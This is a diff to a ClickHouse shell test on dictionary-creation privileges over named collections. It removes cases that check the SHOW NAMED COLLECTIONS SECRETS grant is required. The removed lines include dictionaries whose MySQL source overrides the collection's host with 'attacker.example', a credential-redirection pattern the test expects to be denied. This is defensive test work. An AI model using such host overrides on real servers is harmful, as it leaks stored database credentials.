@@ -20,7 +20,6 @@ CUR_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
 nc="${CLICKHOUSE_TEST_UNIQUE_NAME}_mysql"
 user="${CLICKHOUSE_TEST_UNIQUE_NAME}_user"
 replicated_db="${CLICKHOUSE_DATABASE}_replicated"
-atomic_db="${CLICKHOUSE_DATABASE}_atomic"
 
 NOT_SELECT="Only SELECT query can be used as a dictionary"
 DIFFERENT_READING="cannot contain comments, heredocs, typographic quotes or backslashes"
@@ -34,7 +33,6 @@ function cleanup()
     $CLICKHOUSE_CLIENT --query "DROP NAMED COLLECTION IF EXISTS $nc"
     $CLICKHOUSE_CLIENT --query "DROP NAMED COLLECTION IF EXISTS ${nc}_secret"
     $CLICKHOUSE_CLIENT --query "DROP DATABASE IF EXISTS ${replicated_db} SYNC"
-    $CLICKHOUSE_CLIENT --query "DROP DATABASE IF EXISTS ${atomic_db} SYNC"
 }
 trap cleanup EXIT
 cleanup
@@ -237,48 +235,6 @@ create_as_user "" "$nc"
 echo 'With the grant, RESTORE ON CLUSTER: restored'
 restore_as_user "$user" "MYSQL(NAME $nc TABLE 't')" "ON CLUSTER test_shard_localhost" "NAMED COLLECTION ON \`?${nc}\`?\."
 
-echo '--- Replacing a stored key of the collection requires the privilege SHOW NAMED COLLECTIONS SECRETS'
-# The dictionary checks it where it is created, which is with full access for `ON CLUSTER` and on the hosts of `RESTORE ON CLUSTER`,
-# so it is required before. `$nc` stores `db`.
-# The message can list the two privileges on the collection together.
-SECRETS="SHOW NAMED COLLECTIONS SECRETS(, NAMED COLLECTION)? ON \`?${nc}\`?\."
-function create_override_as_user()
-{
-    $CLICKHOUSE_CLIENT --user "$user" --distributed_ddl_output_mode=none --query "
-        CREATE DICTIONARY ${CLICKHOUSE_DATABASE}.dict_select_only ON CLUSTER test_shard_localhost (id UInt64, value String) PRIMARY KEY id
-            SOURCE(MYSQL(NAME $nc DB 'other' TABLE 't')) LAYOUT(FLAT()) LIFETIME(0) SETTINGS(dictionary_lazy_load = 1)" 2>&1 \
-        | grep -qE "necessary to have the grant ${SECRETS}" && echo 1 || echo 0
-    dictionary_exists
-    $CLICKHOUSE_CLIENT --query "DROP DICTIONARY IF EXISTS dict_select_only"
-}
-echo 'Without the grant, ON CLUSTER: denied, not created'
-create_override_as_user
-echo 'Without the grant, RESTORE ON CLUSTER: denied, not restored'
-restore_as_user "$user" "MYSQL(NAME $nc DB 'other' TABLE 't')" "ON CLUSTER test_shard_localhost" "$SECRETS"
-$CLICKHOUSE_CLIENT --query "GRANT SHOW NAMED COLLECTIONS SECRETS ON $nc TO $user"
-echo 'With the grant, ON CLUSTER: created'
-create_override_as_user
-$CLICKHOUSE_CLIENT --query "REVOKE SHOW NAMED COLLECTIONS SECRETS ON $nc FROM $user"
-# The hosts that create the dictionary can have a collection that this host does not have, with stored keys that are unknown here.
-echo 'A collection that does not exist on this host, without the grant, ON CLUSTER: denied, not created'
-$CLICKHOUSE_CLIENT --query "GRANT NAMED COLLECTION ON ${nc}_missing TO $user"
-$CLICKHOUSE_CLIENT --user "$user" --distributed_ddl_output_mode=none --query "
-    CREATE DICTIONARY ${CLICKHOUSE_DATABASE}.dict_select_only ON CLUSTER test_shard_localhost (id UInt64, value String) PRIMARY KEY id
-        SOURCE(MYSQL(NAME ${nc}_missing HOST 'attacker.example' TABLE 't')) LAYOUT(FLAT()) LIFETIME(0) SETTINGS(dictionary_lazy_load = 1)" 2>&1 \
-    | grep -qE "necessary to have the grant SHOW NAMED COLLECTIONS SECRETS(, NAMED COLLECTION)? ON \`?${nc}_missing\`?\." && echo 1 || echo 0
-dictionary_exists
-# A local `CREATE` does not require it: the query is not sent to other hosts. An `Atomic` database, because the test database can be
-# `Replicated`, which sends the query to its other replicas.
-echo 'A collection that does not exist on this host, without the grant, locally: not denied for the grant, created'
-$CLICKHOUSE_CLIENT --multiquery --query "
-    CREATE DATABASE ${atomic_db} ENGINE = Atomic;
-    GRANT CREATE DICTIONARY ON ${atomic_db}.* TO $user;"
-$CLICKHOUSE_CLIENT --user "$user" --query "
-    CREATE DICTIONARY ${atomic_db}.dict_select_only (id UInt64, value String) PRIMARY KEY id
-        SOURCE(MYSQL(NAME ${nc}_missing HOST 'attacker.example' TABLE 't')) LAYOUT(FLAT()) LIFETIME(0) SETTINGS(dictionary_lazy_load = 1)" 2>&1 \
-    | grep -qE "necessary to have the grant SHOW NAMED COLLECTIONS SECRETS" && echo 1 || echo 0
-$CLICKHOUSE_CLIENT --query "SELECT count() FROM system.tables WHERE database = '${atomic_db}' AND name = 'dict_select_only'"
-$CLICKHOUSE_CLIENT --query "DROP DATABASE ${atomic_db} SYNC"
 echo 'With the grant, the name is an expression: created'
 create_as_user "" "concat('$nc', '')"
 
